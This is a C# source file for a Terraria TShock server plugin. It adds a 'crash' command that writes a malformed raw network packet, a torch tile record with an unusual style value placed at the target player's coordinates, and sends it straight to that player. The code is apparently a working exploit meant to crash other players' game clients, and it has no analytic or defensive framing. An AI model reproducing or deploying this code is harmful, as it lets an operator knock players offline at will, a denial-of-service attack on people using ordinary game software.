using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using LazyUtils;
using LazyUtils.Commands;
using Terraria;
using Terraria.ID;
using TShockAPI;

namespace Crash
{
    [Command("crash")]
    public static class CrashCommand
    {
        [Main, Permission("crash")]
        public static void Main(CommandArgs args, TSPlayer plr)
        {
            using var ms = new MemoryStream();
            using var bw = new BinaryWriter(ms);
            bw.Write(0x004f0010); // size, type
            var x = (short)(plr.TPlayer.position.X / 32);
            var y = (short)(plr.TPlayer.position.Y / 32);
            bw.Write(x); bw.Write(y);
            bw.Write(TileID.Torches); // tile type
            bw.Write((short)99);
            bw.Write(0x0000ff00);
            plr.SendRawData(ms.ToArray());
        }
    }
}
